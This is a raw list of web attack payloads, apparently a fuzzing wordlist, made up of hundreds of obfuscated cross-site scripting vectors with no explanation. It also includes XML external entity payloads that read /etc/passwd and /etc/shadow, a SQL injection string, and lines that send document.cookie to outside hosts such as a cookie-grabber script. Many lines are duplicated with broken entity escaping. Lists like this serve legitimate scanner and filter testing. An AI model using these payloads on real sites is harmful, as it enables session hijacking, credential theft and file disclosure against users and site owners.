<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XXX</a>
40) &#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML>
10) <iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>
window[Boolean[-6][5]+Boolean[-6][3]+Boolean[-6][4]+String[-6][2]+String[-6][1]](1)
/*@cc_on@set@x=88@set@ss=83@set@s=83@*/@cc_on alert(String.fromCharCode(@x,@s,@ss))
<;EMBED SRC=";http://ha.ckers.org/xss.swf"; AllowScriptAccess=";always";>;<;/EMBED>;
String(/http:/+/www.x.se/+(/x/+[])[1]+(/m/+[])[1]+(/8/+[])[1]+(/#/+[])[1]).slice(1) 
<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
'"></title><script>alert("XSS by \n1")</script>><marquee><h1>XSS by 1</h1></marquee>
<meta http-equiv="refresh" content="0;url=javascript:document.write("XSS-XSS-XSS");">
<img """><script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">
<style>BODY{-moz-binding:url("http://www.securitycompass.com/xssmoz.xml#xss")}</style>
<XML SRC="xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
javascript:window[490837..toString(1<<5)](8680439..toString(30))(580049..toString(30))
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
29) </style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<head><base href="javascript://"></head><body><a href="/. /,alert(1)//#">XXX</a></body>
x=eval(eval(eval(eval(eval))), alert(/1/</xmp><script>alert(1)</script><!--));x=eval(x)
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
15) <svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
25) <embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>​
50) </svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
34) <a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=
a="get";&#10;b="URL("";&#10;c="javascript:";&#10;d="alert('XSS');")";&#10;eval(a+b+c+d);
<;META HTTP-EQUIV=";Link"; Content=";<;http://ha.ckers.org/xss.css>;; REL=stylesheet";>;
<;STYLE type=";text/css";>;BODY{background:url(";javascript:alert(';XSS';)";)}<;/STYLE>;
<STYLE>li {list-style-image: url("javascript:alert(&#39;XSS&#39;)");}</STYLE><UL><LI>XSS
<div/style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)> 
'"></title><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
mhtml:http://html5sec.org/test.html!xss.html mhtml:http://html5sec.org/test.gif!xss.html
[_=(/al/ig)[-1]+(/ert/mgi)[1-2]][(/ev/img)[-1]+(/al/gimmi)[-Math.cos(0)]](_).valueOf()(1)
(Å=[],[µ=!Å+Å][µ[È=++Å+Å+Å]+({}+Å)[Ç=!!Å+µ,ª=Ç[Å]+Ç[+!Å],Å]+ª])()[µ[Å]+µ[Å+Å]+Ç[È]+ª](Å) 
<script><script><script><script>{alert(/Why? hehe/)}</script></script></script></script> 
<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>
47) </font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
25) <a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
<;META HTTP-EQUIV=";Set-Cookie"; Content=";USERID=<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;";>;
<;META HTTP-EQUIV=";refresh"; CONTENT=";0; URL=http://;URL=javascript:alert(';XSS';);";>;
<meta HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.vulnerable=true</SCRIPT>">
This one shows that FF reads base64 and ignores every character after until the payload:-
<;IMG SRC=";http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode";>;
<style type="text/css">BODY{background:url("javascript:document.vulnerable=true")}</style>
exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>
with(URIError[-5-0e0])eval(/./.eval((false.toString()).replace(/[fs]/g,'')+'rt('+1e0+')'))
(É=[Å=[],µ=!Å+Å][µ[È=-~-~++Å]+({}+Å)[Ç=!!Å+µ,ª=Ç[Å]+Ç[+!Å],Å]+ª])()[µ[Å]+µ[Å+Å]+Ç[È]+ª](Å)
<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script>
<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>X
<meta HTTP-EQUIV="Link" Content="<http://www.securitycompass.com/xss.css>; REL=stylesheet">
<iframe src="javascript:alert('XSS by \n1');"></iframe><marquee><h1>XSS by 1</h1></marquee>
<;OBJECT TYPE=";text/x-scriptlet"; DATA=";http://ha.ckers.org/scriptlet.html";>;<;/OBJECT>;
46) //|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
window['Event']['constructor']['__proto__']['__proto__']['__parent__']['_content'].alert(1)
14) <meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
(É=[Å=É=[]][(µ=!É+É)[È=++Å+Å+Å]+({}+É)[Å]+(ª=(Ç=!!È+É)[Å]+Ç[+É])])()[µ[Å]+µ[Å+Å]+Ç[È]+ª](Å) 
\u0030\u005b\u0022\x65\x76\x61\x6C"\u005d\u0028\u0027\x61\x6C\x65\x72\x74\x28\x31\x29'\u0029
<style>li {list-style-image: url("javascript:document.vulnerable=true;");</STYLE><UL><LI>XSS
<;XML ID=I>;<;X>;<;C>;<;![CDATA[<;IMG SRC=";javas]]>;<;![CDATA[cript:alert(';XSS';);";>;]]>;
<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
<meta HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:document.vulnerable=true;">
<div id=d><x xmlns="><iframe onload=alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
($=[$=[]][(µ=!$+$)[_=-~-~-~$]+({}+$)[Å=_/_]+(º=(Ç=!''+$)[Å]+Ç[+$])])()[µ[Å]+µ[Å+Å]+Ç[_]+º](Å)
B=/a/[-1]=='a'?'FF':'\v'=='v'?'IE':/a/.__proto__=='//'?'Saf':/s/.test(/a/.toString)?'Chr':'Op'
20) </script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
<OBJECT TYPE="text/x-scriptlet" DATA="http://www.securitycompass.com/scriptlet.html"></object>
javascript:is="used";for each(member in "slackers")can:(u=confirm(/it/))?['p'*le453]:"thanks";
($=[$=[]][(µ=!$+$)[_=-~-~-~$]+({}+$)[Å=_/_]+(º=(Ç=!''+$)[Å]+Ç[+$])])()[µ[Å]+µ[_+~$]+Ç[_]+º](Å)
with(b={})if((b.c=function(){return'ale'})&&(b.a=function(){return'rt'}))eval(b.c()+b.a())(0);
<div style="x:expression((window.r==1)?'':eval('r=1;alert(String.fromCharCode(88,83,83));'))"> 
<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
($=[$=[]][(µ=!$+$)[_=-~-~-~$]+({}+$)[Å=_/_]+(ª=(Ç=!''+$)[Å]+Ç[+$])])()[µ[Å]+µ[_+~$]+Ç[_]+ª](Å) 
(É=[É=[]][(µ=!É+É)[È=-~-~-~É]+({}+É)[Å=È/È]+(ª=(Ç=!!È+É)[Å]+Ç[+É])])()[µ[Å]+µ[È+~É]+Ç[È]+ª](Å) 
<Q%^&*(£@!'" style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>
<iframe src="javascript:alert('XSS by \nxss');"></iframe><marquee><h1>XSS by xss</h1></marquee>
<x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>
a=String(d+(/f/+[])[1]+x+y+(/m/+[])[1]+z+(/h/+[])[1]+(/a/+[])[1]+x+z+y+(/d/+[])[1]+(/e/+[])[1]);
3) <iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<script>document.write("<SCRI");</SCRIPT>PT SRC="http://www.securitycompass.com/xss.js"></script>
<iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>
eval(new Array(new Array(new Array(new Array('aler'))))+Array('t')+[]+Array(Array(Array('(1)'))))
<a href=data&#x3atext/html&#59b&#x61se6&#x34&#x2cPHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4>test</a>
<style>.XSS{background-image:url("javascript:document.vulnerable=true");}</STYLE><A CLASS=XSS></a>
<;STYLE>;.XSS{background-image:url(";javascript:alert(';XSS';)";);}<;/STYLE>;<;A CLASS=XSS>;<;/A>;
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg==">Test</a> 
<div&nbsp &nbsp style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>
<style>p[foo=bar{}*{-o-link:'javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>
<;STYLE>;li {list-style-image: url(";javascript:alert(&#39;XSS&#39;)";);}<;/STYLE>;<;UL>;<;LI>;XSS
<;SCRIPT>;document.write(";<;SCRI";);<;/SCRIPT>;PT SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
44) //<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
<t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;">
'moving',back,'or',forward,'...just',find(/a way/),'to',stop('the'+focus, 'on',411,this.alert('s'))
5) <embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ​
<;XML ID=";xss";>;<;I>;<;B>;<;IMG SRC=";javas<;!-- -->;cript:alert(';XSS';)";>;<;/B>;<;/I>;<;/XML>;
">/XaDoS/><script>alert(document.cookie)</script><script src="http://www.site.com/XSS.js"></script>
6) <object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">​
function bs(n) parseInt(n, n = n.split('').sort().pop().charCodeAt() - 86) + "..toString(" + n + ")"
(µ=[µ=[]][(ø=!µ+µ)[ª=-~-~-~µ]+({}+µ)[ª/ª]+(æ=(µª=!!ª+µ)[ª/ª]+µª[+µ])])()[ø[ª/ª]+ø[ª+~µ]+µª[ª]+æ](ª/ª)
32) <script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(1)//#x"/>
a=";get";;&;#10;b=";URL(";";;&;#10;c=";javascript:";;&;#10;d=";alert(';XSS';);";)";;&#10;eval(a+b+c+d);
30) <script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<a href=dat&#x61&#x3atext&#x2fhtml&#x3b&#59base64a&#x2cPHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4>Test</a>
+ADw-/title+AD4APA-meta http-equiv+AD0-'content-type' content+AD0-'text/html+ADs-charset+AD0-utf-7'+AD4-
sure:with('morfi')you:'can',prompt('ly');throw 'your',(self in top),'position';of:'any'+(contest=!!!1);-P
<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://www.procheckup.com/?sid="%2bdocument.cookie)>
javascript:(function($)window[$.next()]($.next())(7911..toString(16)))($ for($ in {eval:1,alert:1})if($)) 
<script>location.href="http://www.evilsite.org/cookiegrabber.php?cookie="+escape(document.cookie)</script>
($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+($$=($_=!''+$)[_/_]+$_[+$])])()[__[_/_]+__[_+~$]+$_[_]+$$](_/_)
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
$=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+($$=($_=!''+$)[_/_]+$_[+$])],$()[__[_/_]+__[_+~$]+$_[_]+$$](_/_)
XXX<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>
<? foo="><script>alert(1)</script>"> <! foo="><script>alert(1)</script>"> </ foo="><script>alert(1)</script>">
<a href=dat&#x61&#x3atext&#x2fhtml&#x3b&#59base64ANYTHING&#x2cPHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4>Test</a>
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>
<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K";>;
with(document)with(body)appendChild(createElement(Script.name)).src=String(/http:/+/www.x.se/+/xm8#/).slice(1); 
javascript:/**/while /**/(/**/typeof/**/ top/**/[/**/"al"/**/+/**/"ert"/**/]/*[*/(/**/1/**/)/**/)/**/break/**/;// 
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
http://www.simpatie.ro/index.php?page=friends&member=781339&javafunctionname=Pageclick&javapgno=2 javapgno=2 ??XSS??
39) <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<iframe SRC=&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#39&#88&#83&#83&#39&#41>
<a href=&#x20&#100&#97&#116&#97&#x3atext/html&#59b&#x61se6&#x34&#x2cPHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4>test</a>
String.prototype.can_i_has_alert('?') = function() { this.toNumber(alert('okthxbye!')); }; this.can_i_has_alert('?');
49) <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<!ENTITY x "&#x3C;html:img&#x20;src='x'&#x20;xmlns:html='http://www.w3.org/1999/xhtml'&#x20;onerror='alert(1)'/&#x3E;">
<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
/*-->]]>%>?></object></script></title></textarea></noscript></style></xmp>'-/"/-alert(1)//><img src=1 onerror=alert(1)>'
<!DOCTYPE x [ <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "x" onerror CDATA "alert(1)"> ]><img />
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'"-->
31) <script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script​​​​​​​​​​​​
document.evaluate('//body', document, null, XPathResult.ANY_TYPE, null).iterateNext().innerHTML='<iframe onload=alert(1)>'
<;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(';XSS';)>;<;/OBJECT>;
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="alert(/XSS/)" onclick="alert(/XSS/)"></div>
<x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(1)" xlink:type="simple"/>
<@uni>0<@/uni><@uni>["<@/uni><@hex>eval<@/hex>"<@uni>]<@/uni><@uni>(<@/uni><@uni>'<@/uni><@hex>alert(1)<@/hex>'<@uni>)<@/uni>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
44) <div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>​
<HTML xmlns:xss><?import namespace="xss" implementation="http://www.securitycompass.com/xss.htc"><xss:xss>XSS</xss:xss></html>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></object>
<p><a onclick="i=createElement('iframe');i.src='javascript:alert(/XSS/)';x=parentNode;x.appendChild(i);" href="#">Test</a></p>
<;!--#exec cmd=";/bin/echo ';<;SCRIPT SRC';";-->;<;!--#exec cmd=";/bin/echo ';=http://ha.ckers.org/xss.js>;<;/SCRIPT>;';";-->;
<form xmlns="http://www.w3.org/1999/xhtml" target="_top" action="javascript:alert(1)"><input value="XXX" type="submit"/></form>
{a=(typeof (/./[-1])),b=a.replace(/s/,(a[0]).toUpperCase()),self['ev'+'al'](b+'.'+'fromµharµode'.replace(/µ/g,'C')+'(1e0*82)')}
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
I:would=/l/i;ke:to=alert;so=/methin/g;ind=/ef/i;nit='ely',but='sadly';I:do{_='not';know=/how/;to(_)}while(/remainin/g<'legible')
23) <a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
<button style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="alert(/XSS/)" onclick="alert(/XSS/)"></button>
<script src="/\example.com\foo.js"></script> // Safari 5.0, Chrome 9, 10 <script src="\\example.com\foo.js"></script> // Safari 5.0
<div/style=<@backslashesc>-moz-binding<@/backslashesc>:<@backslashesc>url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)<@/backslashesc>>
20) <iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<embed src="javascript:alert(1)"> <img src="javascript:alert(1)"> <image src="javascript:alert(1)"> <script src="javascript:alert(1)">
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo>
+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);
'\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029'.replace(/\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029/,\u0065\u0076\u0061\u006c)
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
29) <script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<svg xmlns="http://www.w3.org/2000/svg"> <handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler> </svg>
<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<li style=list-style:url() onerror=alert(1)> <div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)></div>
eval(dispatchEvent[-5][4]+enableExternalCapture[-5][4]+dispatchEvent[-5][10]+enableExternalCapture[-5][10]+dispatchEvent[-5][5]+/(1)/[-1]) 
<head><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-
<;HEAD>;<;META HTTP-EQUIV=";CONTENT-TYPE"; CONTENT=";text/html; charset=UTF-7";>; <;/HEAD>;+ADw-SCRIPT+AD4-alert(';XSS';);+ADw-/SCRIPT+AD4-
<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>
0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))
<div style=background:url('http://mail.yahoo.com/'logo.jpg;x:\65\78\70\72\65\73\73\69\6f\6e\28\61\6c\65\72\74\28\31\29\29;'xxx:xx');></div> 
<XML ID=I><X><C><![<IMG SRC="javas]]<![cript:document.vulnerable=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></span>
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<@uni>1<@/uni> + <@uni>1<@/uni><@uni>[<@/uni>'<@oct>eval<@/oct><@oct><@/oct>'<@uni>]<@/uni><@uni>(<@/uni>'<@oct>alert(1)<@/oct>'<@uni>)<@/uni>
<svg xmlns="http://www.w3.org/2000/svg"> <set attributeName="onmouseover" to="alert(1)"/> <animate attributeName="onunload" to="alert(1)"/> </svg>
<div id=d><div style="font-family:'sans\27\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
({}.constructor.prototype.toString=function(){return "f".constructor.fromCharCode(95,95,112,97,114,101,110,116,95,95);}, y={},y[{}].alert('lose')) 
<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(2)">XXX</a>
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:document.vulnerable=true"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></span>
<@uni>e=0[<@/uni>'<@hex>ev<@/hex><@oct>al<@/oct>'<@uni>](<@/uni>'<@oct>b+z+61+b+z+6+c+b+z+65+b+z+72+b+z+74+b+z+28+b+z+31+b+z+29<@/oct>'<@uni>)<@/uni>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<;IMG SRC=&;#x6A&;#x61&;#x76&;#x61&;#x73&;#x63&;#x72&;#x69&;#x70&;#x74&;#x3A&;#x61&;#x6C&;#x65&;#x72&;#x74&;#x28&;#x27&;#x58&;#x53&;#x53&;#x27&;#x29>;
javascript:b = /alert/.source; a = eval("b");; x = top["win"+"dow"];y=eval("doc_ument".replace("_",""));z = top["ev"+"al"]("y.co"+"okie"); x.alert(z); 
43) <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>​
eval(<x>{dispatchEvent[-5][4]}{enableExternalCapture[-5][4]}{dispatchEvent[-5][10]}{enableExternalCapture[-5][10]}{dispatchEvent[-5][5]}</x>..*+/(1)/[-1])
>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;XSS%26quot;)>
<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>
<;IMG RC=&;#106;&;#97;&;#118;&;#97;&;#115;&;#99;&;#114;&;#105;&;#112;&;#116;&;#58;&;#97;&;#108;&;#101;&;#114;&;#116;&;#40;&;#39;&;#88;&;#83;&;#83;&;#39;&;#41;>;
1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(1)&gt;`>
&lt;\sc\r\ipt&gt;ale\u0072t('SS\x58'.&#x73;&#x70;&#x6c;&#x69;&#x74;('').&#114;&#101;&#118;&#101;&#114;&#115;&#101;().&#x6a;&#x6f;&#105;&#110;(''))&lt;\/\sc\r\ipt&gt; 
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028\0027\0058\0053\0053\0027\0029'\0029">
e(c(97)+c(108)+c(101)+c(114)+c(116)+c(40)+c(39)+c(79)+c(119)+c(110)+c(101)+c(100)+c(32)+c(98)+c(121)+c(32)+c(84)+c(101)+c(97)+c(109)+c(32)+c(78)+c(48)+c(48)+c(66)+c(33)+c(39)+c(41));
<div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%33%33%37%29%3C%2F%73%63%72%69%70%74%3E%3C%6D%61%72%71%75%65%65%3E%3C%68%31%3E%58%53%53%20%62%79%20%31%3C%2F%68%31%3E%3C%2F%6D%61%72%71%75%65%65%3E
>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>
%22%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%33%33%37%29%3C%2F%73%63%72%69%70%74%3E%3E%3C%6D%61%72%71%75%65%65%3E%3C%68%31%3E%58%53%53%20%62%79%20%31%3C%2F%68%31%3E%3C%2F%6D%61%72%71%75%65%65%3E
<IMG&#x0D;SRC&#x0D;=&#x0D;"&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;'&#x0D;X&#x0D;S&#x0D;S&#x0D;'&#x0D;)&#x0D;"&#x0D;>&#x0D;
